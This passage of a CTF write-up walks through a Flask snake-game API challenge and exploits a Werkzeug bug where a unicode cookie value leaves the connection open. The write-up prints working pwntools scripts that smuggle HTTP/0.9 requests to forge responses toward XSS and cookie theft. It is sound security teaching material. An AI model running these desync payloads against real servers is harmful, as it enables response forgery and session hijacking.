+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Routes</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    init(session)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/api&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">note</span>():
+</span></span><span style="display:flex;"><span>    init(session)
+</span></span><span style="display:flex;"><span>    action <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;action&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> action:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;?action= must be set!&#34;</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;color&#34;</span>:
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> Response(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback&#34;</span>))
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;color=</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;color&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;add&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;invalid HTTP method&#34;</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        d <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form <span style="color:#66d9ef">else</span> request<span style="color:#f92672">.</span>get_json()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (<span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#f92672">in</span> d <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;score&#34;</span> <span style="color:#f92672">in</span> d):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;name and score must be set&#34;</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#34;scores&#34;</span>] <span style="color:#f92672">+=</span> [{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;name&#34;</span>: d[<span style="color:#e6db74">&#34;name&#34;</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;score&#34;</span>: d[<span style="color:#e6db74">&#34;score&#34;</span>]
+</span></span><span style="display:flex;"><span>        }]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;length&#34;</span>: len(session[<span style="color:#e6db74">&#34;scores&#34;</span>])})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;view&#34;</span>:
+</span></span><span style="display:flex;"><span>        raw <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;raw&#34;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> raw:
+</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> Response(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>v[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> -&gt; </span><span style="color:#e6db74">{</span>v[<span style="color:#e6db74">&#39;score&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> session[<span style="color:#e6db74">&#34;scores&#34;</span>] ]))
+</span></span><span style="display:flex;"><span>            res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            res <span style="color:#f92672">=</span> jsonify(session[<span style="color:#e6db74">&#34;scores&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> res
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;clear&#34;</span>:
+</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;clear&#34;</span>: <span style="color:#66d9ef">True</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;invalid action value (color || add || view || clear)&#34;</span>})
+</span></span></code></pre></div><p>The rest of the application is marked as useless for solving the challenge (<em>Example: main.js, index.html</em>).
+The application is an implementation of the snake game, where you can save your scores and display them in a global scoreboard. You can also change the background color.</p>
+<p>We can ignore the visual part and consider the service as an API.</p>
+<p>This api offers a single endpoint with several actions:</p>
+<ul>
+<li><code>/api?action=add</code> adds a score to the general ranking</li>
+<li><code>/api?action=clear</code> resets the ranking to 0</li>
+<li><code>/api?action=color</code> changes the color of the HTML page.</li>
+<li><code>/api?action=view</code> displays and retrieves the scoreboard.</li>
+</ul>
+<p>It&rsquo;s with these <em>4</em> options that we&rsquo;re going to retrieve the two flags.</p>
+<h2 id="presentations-of-the-various-actions">Presentations of the various actions.</h2>
+<p>It&rsquo;s important to keep in mind all the possible options for calling these actions.</p>
+<h4 id="action-add">Action: <em>add</em></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;invalid HTTP method&#34;</span>})
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form <span style="color:#66d9ef">else</span> request<span style="color:#f92672">.</span>get_json()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (<span style="color:#e6db74">&#34;name&#34;</span> <span style="color:#f92672">in</span> d <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;score&#34;</span> <span style="color:#f92672">in</span> d):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;name and score must be set&#34;</span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session[<span style="color:#e6db74">&#34;scores&#34;</span>] <span style="color:#f92672">+=</span> [{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>: d[<span style="color:#e6db74">&#34;name&#34;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;score&#34;</span>: d[<span style="color:#e6db74">&#34;score&#34;</span>]
+</span></span><span style="display:flex;"><span>}]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;length&#34;</span>: len(session[<span style="color:#e6db74">&#34;scores&#34;</span>])})
+</span></span></code></pre></div><p>Remember that:</p>
+<ul>
+<li>The method is <strong>POST</strong>.</li>
+<li>The body can be in <code>application/json</code> or <code>application/x-www-form-urlencoded</code>.</li>
+<li>The body must contain a <code>name</code> parameter and a <code>score</code> parameter.</li>
+<li>The set of scores is stored in the session cookie.</li>
+</ul>
+<h4 id="action-clear">Action: <em>clear</em></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>session<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;clear&#34;</span>: <span style="color:#66d9ef">True</span>})
+</span></span></code></pre></div><p>It simply allows you to have a session with an empty scoreboard.</p>
+<h4 id="action-view">Action: <em>view</em></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>raw <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;raw&#34;</span>, <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> raw:
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> Response(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([ <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>v[<span style="color:#e6db74">&#39;name&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> -&gt; </span><span style="color:#e6db74">{</span>v[<span style="color:#e6db74">&#39;score&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> session[<span style="color:#e6db74">&#34;scores&#34;</span>] ]))
+</span></span><span style="display:flex;"><span>    res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> jsonify(session[<span style="color:#e6db74">&#34;scores&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> res
+</span></span></code></pre></div><p>This option takes an optional <em>raw</em> parameter and returns, in text or json, the scoreboard stored in the session.</p>
+<h4 id="action-color">Action: <em>color</em></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>res <span style="color:#f92672">=</span> Response(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;callback&#34;</span>))
+</span></span><span style="display:flex;"><span>res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Content-Type&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;text/plain&#34;</span>
+</span></span><span style="display:flex;"><span>res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Set-Cookie&#34;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;color=</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;color&#39;</span>, <span style="color:#e6db74">&#39;red&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> res
+</span></span></code></pre></div><p>This fourth action defines the &ldquo;color&rdquo; cookie with a value taken as a request parameter.<br>
+It also returns the contents of the <em>callback</em> parameter in the body.</p>
+<h2 id="first-approach-and-discovery-of-the-entry-point">First approach and discovery of the entry point.</h2>
+<p>Given the presence of a selenium bot and the lack of backend functionality, it&rsquo;s clear that this will be a client-side challenge.<br>
+The four options presented above are minimalist and don&rsquo;t seem to present any critical vulnerabilities.</p>
+<p>To make sure I didn&rsquo;t miss anything, despite the challenge creator&rsquo;s comments, I looked for vulnerabilities in the application&rsquo;s static files: <em>index.html</em> and <em>main.js</em>.<br>
+Once this doubt was removed, I remained focused on these 4 options until the end of the challenge.</p>
+<p>My first objective was to obtain an <em>XSS</em>, as the first flag is not HttpOnly and will therefore be accessible if I find an <em>XSS</em> on domain 127.0.0.1.</p>
+<p>However, the api doesn&rsquo;t return any page with a <em>Content-Type</em> interpretable in html!<br>
+The only Content-Types returned are:</p>
+<ul>
+<li><code>text/plain</code></li>
+<li><code>application/json</code></li>
+</ul>
+<p>So I decided to go to <a href="https://github.com/pallets/werkzeug/issues" target="_blank">the github of the <em>Werkzeug</em> server</a> and see if there was a recent vulnerability we could use.</p>
+<p>Fortunately for us, a way out seems to be emerging:</p>
+<ul>
+<li><a href="https://github.com/pallets/werkzeug/issues/2833" target="_blank">Request not closed with Unicode characters in headers #2833</a></li>
+</ul>
+<p><em>Before analyzing the report, we note that the creator of the challenge is the same creator as the github issue (<a href="https://twitter.com/kevin_mizu" target="_blank">Mizu</a>) ! This is a good sign for the progress of the challenge.</em></p>
+<p>He describes a cookie decoding problem that allows a request to be crashed and its body to be passed off as a second request:</p>
+<pre tabindex="0"><code>When responding with a unicode characters in a header key / value, it results in a UnicodeEncodeError (already known with #742, #1286...), but in addition, it doesn&#39;t close the connection, leading to use the body as a new request.
+</code></pre><p>Headers are sent before cookies are parsed. So if the decoding of a <em>latin-1</em> cookie crashes, the server will stop transmission of the response and will not send the <code>Connection: close</code> header, which closes the TCP connection between the browser and the server.</p>
+<p>So, if a request is passed in the body of a <em>POST</em> request at the same time, the latter will be put in the server buffer and will be considered as a new request and not the content of the previous one.</p>
+<p>This bug is called a <em>Client side desync</em> since there is a desynchronization between the data sent and the way it is interpreted.</p>
+<h3 id="back-to-the-challenge">Back to the challenge</h3>
+<p>Once you&rsquo;ve read the report, you can test this bug on the application using the <code>color</code> action, which sets a cookie.</p>
+<p>We can reuse the <code>\uffff</code> character (<em>Url-encoded: %ef%bf%bf</em>) proposed by Mizu.</p>
+<p>I wrote this first <em>P-O-C</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">8000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api?action=color&amp;color=</span><span style="color:#e6db74">%e</span><span style="color:#e6db74">f%bf%bf HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 500</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /abc HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: vozec</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> str(io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>))[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+</span></span></code></pre></div><p>This is the error displayed in the docker console:<br>
+<img src="https://i.imgur.com/pB5RjsH.png" alt="Client-Side desync POC"></p>
+<p>You can see that a query on <code>/abc</code> has been performed!</p>
+<p>What&rsquo;s more, the request is back:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.0.1 Python/3.11.8<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 20:36:52 GMT<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/plain<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">404</span> NOT FOUND<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Server: Werkzeug/3.0.1 Python/3.11.8<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Date: Fri, <span style="color:#ae81ff">12</span> Apr <span style="color:#ae81ff">2024</span> 20:36:52 GMT<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Content-Length: 207<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>Connection: close<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>&lt;!doctype html&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span>en&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;title&gt;404 Not Found&lt;/title&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Not Found&lt;/h1&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<span style="color:#ae81ff">\n</span>
+</span></span></code></pre></div><p>Note that the headers are sent twice, which is in line with the description of the bug that Mizu presented.</p>
+<h2 id="first-exploitation">First exploitation.</h2>
+<p>At this stage, it is possible to return a different page from the one expected by the <em>color</em> function.</p>
+<p>Several problems arise:</p>
+<ul>
+<li>The page content is not controlled</li>
+<li>The <em>Content-Type</em> of the response is not checked.</li>
+<li>The application repeatedly returns headers with HTTP code in the middle, making the response malformed and therefore incomprehensible to a browser.</li>
+</ul>
+<p>In order to trigger an XSS, you need to fix all 3 bugs!</p>
+<p>Playing with the various HTTP options, I realized that if the second request, the smuggled request, was in HTTP/0.9, the return was different:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api?action=color&amp;color=</span><span style="color:#e6db74">%e</span><span style="color:#e6db74">f%bf%bf HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 500</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /abc HTTP/0.9</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: vozec</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>returns only the body, not the headers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 poc_twisty.py
+</span></span><span style="display:flex;"><span>&lt;!doctype html&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span>en&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;title&gt;404 Not Found&lt;/title&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Not Found&lt;/h1&gt;<span style="color:#ae81ff">\n</span>
+</span></span><span style="display:flex;"><span>&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;<span style="color:#ae81ff">\n</span>
+</span></span></code></pre></div><p>This solves our last problem, that of invalid headers. Since these no longer exist!</p>
+<p>So we need to find a way of controlling the content of the response in order to forge a valid HTTP response that our browser can understand.</p>
+<p>The next step will be to find a way to return a <code>200 OK</code> response with a Content-type of <em>text/html</em> and an html page with an xss in the body.</p>
+<h3 id="première-solution">Première solution:</h3>
+<p>One solution would be to re-use the color action with the callback parameter to define the raw content of the response.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote_plus
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> quote_plus()<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hello there
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POST /api?action=color&amp;color=%ef%bf%bf HTTP/1.1</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: localhost:8000</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Content-Length: 500</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /api?action=color&amp;callback=</span><span style="color:#e6db74">{</span>response<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/0.9</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: vozec</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"></span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p><em>Server response</em> : <code>Hello there</code></p>
+<h3 id="second-solution">Second solution:</h3>
+<p>Another possibility, and the one I used, is to use the <code>view</code> action to display the raw content of a scoreboard.</p>
+<p>The idea is to store our response in the <code>name</code> or <code>score</code> parameter of the <code>add</code> action, in order to retrieve a session cookie containing our response, and then use the <code>view</code> action with the <em>raw</em> parameter set to 1 to get a raw response.</p>
+<p>Here&rsquo;s the Python code we used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_session</span>(payload):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8000&#39;</span>
